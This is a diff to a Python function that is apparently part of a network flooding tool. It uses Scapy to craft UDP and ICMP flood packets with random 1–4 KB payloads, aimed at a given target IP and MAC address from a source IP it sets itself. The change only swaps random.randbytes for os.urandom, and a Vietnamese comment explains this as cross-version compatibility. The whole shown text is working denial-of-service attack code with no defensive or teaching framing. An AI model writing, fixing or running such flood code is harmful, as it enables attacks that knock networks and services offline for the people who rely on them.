@@ -49,14 +49,16 @@ def _create_packet_for_worker(attack_type: str, target_ip: str, target_mac: str,
                     
     elif attack_type == 'udp_flood':
         src_port = random.randint(1024, 65535)
-        payload = random.randbytes(random.randint(1024, 4096))
+        # Sử dụng os.urandom thay vì random.randbytes để tương thích với mọi phiên bản Python
+        payload = os.urandom(random.randint(1024, 4096))
         return bytes(Ether(dst=target_mac) / 
                     IP(src=src_ip, dst=target_ip) / 
                     UDP(sport=src_port, dport=port) / 
                     payload)
                     
     elif attack_type == 'icmp_flood':
-        payload = random.randbytes(random.randint(512, 2048))
+        # Sử dụng os.urandom thay vì random.randbytes để tương thích với mọi phiên bản Python
+        payload = os.urandom(random.randint(512, 2048))
         return bytes(Ether(dst=target_mac) / 
                     IP(src=src_ip, dst=target_ip) / 
                     ICMP() / payload)
